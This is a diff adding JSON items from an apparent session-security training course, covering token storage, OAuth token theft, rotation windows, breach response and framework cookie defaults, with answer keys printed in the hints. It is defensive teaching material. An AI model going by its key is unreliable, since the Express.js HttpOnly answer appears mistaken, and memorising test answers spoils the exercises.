+          "starter_code": "// TODO: Mobile apps often:\n// Store tokens in: ___ (insecure on rooted devices)\n// Transmit tokens via: ___ (if cert pinning is missing)\n// Never expire tokens: ___ (convenience over security)\n// Defence: ___",
+          "expected_output": "SharedPreferences/Keychain / HTTPS but vulnerable to MITM without pinning / tokens last forever, stolen once = permanent access / Use short-lived tokens + refresh tokens + cert pinning",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: SharedPreferences/Keychain / HTTPS but vulnerable to MITM without pinning / tokens last forever, sto"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: OAuth Token Hijacking",
+          "description": "Explain how OAuth tokens can be stolen.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// TODO:\n// OAuth access token is like: ___\n// If stolen via XSS, attacker can: ___\n// Token stored in localStorage is ___\n// Better storage: ___",
+          "expected_output": "A session cookie (proof of authentication) / Make API calls as the user / accessible to any JS on the page (vulnerable to XSS) / HttpOnly cookie or in-memory only",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: A session cookie (proof of authentication) / Make API calls as the user / accessible to any JS on th"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_58",
+          "title": "Exercise 58: Calculate Attack Window",
+          "description": "Determine how long an attacker has.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// Session timeout: 30 minutes\n// Token rotation: every 15 minutes\n// Cookie stolen at 10:00 AM\n// TODO:\n// Cookie expires at: ___\n// But rotates at: ___\n// Attacker's window: ___",
+          "expected_output": "10:30 AM / 10:15 AM (next rotation) / Only 15 minutes maximum — rotation limits the replay window",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: 10:30 AM / 10:15 AM (next rotation) / Only 15 minutes maximum — rotation limits the replay window"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: Incident Response: Session Breach",
+          "description": "Write a response plan for mass session theft.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// 1000 session cookies were stolen via XSS.\n// TODO: Response plan:\n// Immediate (0-5 min): ___\n// Short term (5-30 min): ___\n// Medium term (1-24 hrs): ___\n// Long term: ___",
+          "expected_output": "Immediate: invalidate ALL sessions (force everyone to re-login). Short: patch the XSS, deploy CSP. Medium: notify affected users, reset passwords. Long: add HttpOnly, Secure, session monitoring, bug bounty.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Immediate: invalidate ALL sessions (force everyone to re-login). Short: patch the XSS, deploy CSP. M"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Compare Session Frameworks",
+          "description": "Rate session security of popular frameworks.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// TODO: Rate each (Good/OK/Bad default security):\n// Java Servlet: HttpOnly default = ___\n// PHP: HttpOnly default = ___\n// Express.js: HttpOnly default = ___\n// Django: HttpOnly default = ___\n// Which has the best defaults? ___",
+          "expected_output": "Java: Not set by default (Bad). PHP: Off by default (Bad). Express: Off by default (Bad). Django: HttpOnly=True by default (Good). Django has the best session security defaults.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Java: Not set by default (Bad). PHP: Off by default (Bad). Express: Off by default (Bad). Django: Ht"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
